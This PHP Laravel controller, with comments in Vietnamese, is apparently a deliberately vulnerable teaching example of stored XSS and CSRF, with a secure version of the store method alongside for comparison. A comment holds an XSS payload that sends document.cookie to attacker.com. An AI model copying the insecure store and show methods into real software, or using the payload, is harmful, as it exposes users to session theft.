<?php

namespace App\Controllers;

use Illuminate\Http\Request;
use App\Models\Post;

/**
 * LỖ HỔNG CỐ Ý - CHỈ DÀNH CHO MỤC ĐÍCH GIÁO DỤC
 *
 * Các lỗ hổng:
 * 1. XSS (Cross-Site Scripting) dạng Stored (Lưu trữ) (CWE-79) | Mức độ: CAO | CVSS: 7.5
 * 2. CSRF (Cross-Site Request Forgery) (CWE-352) | Mức độ: TRUNG BÌNH | CVSS: 6.5
 * OWASP: A03:2021 (XSS), A04:2021 (CSRF)
 *
 * KHÔNG SỬ DỤNG MÃ NÀY TRONG THỰC TẾ
 */
class PostController
{
    /**
     * LỖ HỔNG BẢO MẬT: Lưu bài viết không kiểm duyệt (XSS) và thiếu token (CSRF).
     *
     * Payload tấn công XSS: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
     * Lỗi CSRF: Bất kỳ trang web độc hại nào cũng có thể gửi POST request ẩn tới đây.
     */
    public function store(Request $request)
    {
        // Lỗi CSRF: Bỏ qua bước kiểm tra CSRF token bảo mật.
        // Lỗi XSS (Lưu trữ): Không áp dụng hàm làm sạch đầu vào (như htmlspecialchars).
        $post = new Post();
        $post->title   = $request->input('title');     // Nhận chuỗi thô từ người dùng
        $post->content = $request->input('content');   // Mã JS độc hại sẽ được lưu thẳng vào CSDL
        $post->user_id = session('user_id');
        $post->save();

        return redirect('/posts')->with('success', 'Post created!');
    }

    /**
     * LỖ HỔNG BẢO MẬT: Hiển thị bài viết mà không chuyển mã (escape) các ký tự HTML.
     */
    public function show($id)
    {
        $post = Post::find($id);
        // Lỗi XSS (khi render): Trả dữ liệu thô ra View. Nếu View sử dụng thẻ {!! !!} 
        // của Blade, trình duyệt sẽ tự động thực thi các mã JS độc hại được lén lút gài vào từ trước.
        return view('posts.show', ['post' => $post]);
    }

    /**
     * ✅ SECURE VERSION: Sanitize + CSRF-protected (for comparison)
     */
    public function storeSecure(Request $request)
    {
        // ✅ CSRF token validated by Laravel middleware automatically
        $validated = $request->validate([
            'title'   => 'required|string|max:255',
            'content' => 'required|string|max:10000',
        ]);

        $post = new Post();
        $post->title   = htmlspecialchars($validated['title'],   ENT_QUOTES, 'UTF-8');
        $post->content = htmlspecialchars($validated['content'], ENT_QUOTES, 'UTF-8');
        $post->user_id = auth()->id();
        $post->save();

        return redirect('/posts')->with('success', 'Post created securely!');
    }

    /**
     * List all posts
     */
    public function index()
    {
        $posts = Post::latest()->paginate(10);
        return view('posts.index', compact('posts'));
    }

    /**
     * Delete a post
     */
    public function destroy($id)
    {
        $post = Post::findOrFail($id);
        $post->delete();
        return redirect('/posts')->with('success', 'Post deleted!');
    }
}
